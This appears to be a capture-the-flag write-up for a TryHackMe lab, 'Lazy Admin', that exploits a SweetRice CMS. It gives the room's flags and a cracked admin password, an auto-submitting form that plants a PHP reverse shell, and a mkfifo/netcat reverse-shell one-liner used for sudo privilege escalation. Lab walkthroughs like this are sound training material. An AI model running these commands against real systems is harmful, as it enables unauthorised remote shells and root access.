# LAZY ADMIN

## BASIC INFO
```
export IP=10.10.73.146

```

> - **What is the user flag?**
>> THM{63e5bce9271952aad1113b6f1ac28a07}

> - **What is the root flag?**
>> THM{6637f41d0177b6f37cb20d775124699f}

Using gobuster found a directory /content. Navigate to that directory to see. So it is sweetrice huh... searchsploit shows some result on sweetrice and one of it mentioned about a mysql backup. Remember seeing it on /content/inc... Looking into the backup file reveals the admin account and password. The password is hashed so using john or just using crackstation will do.
```
42f749ade7f9e195bf475f37a44cafcb
manager:Password123
```

Now we're logged in as admin. Another result from searchsploit shows that there is a RCE vulnerablilities on it. Go to ads and create a new ads named hacked or anything. Then add the following code into it.
```html
<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
<!-- php reverse shell here -->
?>
&lt;/textarea&gt;
</form>
</body>
</html>
```

Then we can access it by navigating to /content/inc/ads/hacked.php
Remember to set up a listener before it.`nc -lnvp <port>`

Now we're in as www-data. Let's run `sudo -l`. It shows that we can run `/usr/bin/perl /home/itguy/backup.pl` as sudo without password. We can read backup.pl but we don't have write access to it... Reading backup.pl shows that it is executing another file in /opt. Navigate to /opt and ew can edit copy.sh which is the file backup.pl is executing. Echo the following command into copy.sh
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.7.208 9002 >/tmp/f
```

Now set up another listener and run `/usr/bin/perl /home/itguy/backup.pl` and we are root.